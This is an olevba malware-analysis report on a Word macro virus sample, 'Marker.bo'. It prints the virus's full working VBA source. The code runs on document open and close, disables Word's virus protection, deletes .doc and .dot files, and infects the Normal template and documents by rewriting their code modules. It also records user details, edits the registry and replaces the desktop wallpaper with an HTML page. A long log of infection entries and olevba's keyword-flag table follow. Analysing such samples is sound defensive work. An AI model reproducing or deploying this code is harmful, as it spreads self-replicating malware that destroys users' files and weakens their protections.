olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bo-0d834521e0a5546162c37e2a05cb624201893dc5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bo-0d834521e0a5546162c37e2a05cb624201893dc5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.deletelines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.deletelines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:41:387:41:38 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:43:2212:43:22 PM PM-Monday, 30 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:02:559:02:55 -Sabtu, 28 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:16:1314:16:13 -Jumat, 3 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:17:374:17:37 AM AM-Saturday, 4 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:42:399:42:39 PM PM-Monday, 6 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:00:4210:00:42 PM PM-Wednesday, 8 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:19:334:19:33 PM PM-Thursday, 9 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:32:279:32:27 AM AM-Thursday, 16 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:23:111:23:11 PM PM-Wednesday, 6 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:56:212:56:02 PM PM-Friday, 8 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:37:611:37:06 AM AM-Saturday, 9 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:43:710:43:07 PM PM-Thursday, 14 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:30:25:30:02 PM PM-Wednesday, 10 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:17:510:17:05 AM AM-Tuesday, 16 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:28:544:28:54 AM AM-Thursday, 18 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:20:148:20:14 PM PM-Wednesday, 24 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:12:209:12:20 PM PM-Sunday, 5 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:04:213:04:21 PM PM-Thursday, 9 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:44:549:44:54 PM PM-Tuesday, 14 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:43:4310:43:43 AM AM-Saturday, 18 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:04:5612:04:56 PM PM-Tuesday, 28 Mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:29:5710:29:57 AM AM-Monday, 3 Apr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:08:5611:08:56 AM AM-Thursday, 6 Apr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:50:1110:50:11 AM AM-Friday, 21 Apr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:57:343:57:34 PM PM-Monday, 24 Apr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:10:2212:10:22 PM PM-Monday, 26 Jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:25:2612:25:26 AM AM-Tuesday, 8 Aug 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:40:78:40:07 AM AM-Saturday, 19 Aug 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:02:11:02:01 PM PM-Monday, 21 Aug 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:13:1710:13:17 Nedo Nedo-petak, 6 lis 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:14:3614:14:36 -petak, 8 ožu 2002
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:19:3009:19:30 -subota, 1 lip 2002
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:26:5904:26:59 -četvrtak, 10 lip 2004
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:03:4713:03:47 -srijeda, 3 kol 2005
' JonMMx 2000
' JonMMx2000@yahoo.com

 


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

